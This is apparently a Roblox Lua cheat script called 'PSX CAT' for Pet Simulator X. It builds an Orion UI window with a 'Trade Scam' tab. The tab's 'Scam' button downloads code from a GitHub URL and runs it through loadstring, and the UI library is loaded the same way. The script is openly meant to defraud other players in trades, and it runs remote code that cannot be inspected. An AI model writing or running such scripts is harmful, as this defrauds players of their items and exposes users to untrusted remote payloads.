local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "PSX CAT", HidePremium = false, SaveConfig = true, IntroText = "PSX CAT"})

OrionLib:MakeNotification({
	Name = "Logged in",
	Content = "You Are Logged In As "..Player.Name..".",
	Image = "rbxassetid://4483345998",
	Time = 5
})


--main
local Main = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Section = Main:AddSection({
	Name = "Trade scam"
})

Main:AddButton({
	Name = "Scam",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/subhian922/tradescamss/main/newscam"))()
  	end    
})

--Credits
local Credits = Window:MakeTab({
    Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Credits:AddSection({
	Name = "Owner"
})

Credits:AddLabel("Shooter2.0")

local Section = Credits:AddSection({
	Name = "Discord"
})

Credits:AddLabel("PSX HUB")

local Section = Credits:AddSection({
	Name = "Discord link"
})

Credits:AddLabel("https://discord.gg/4e8NcdEtt9")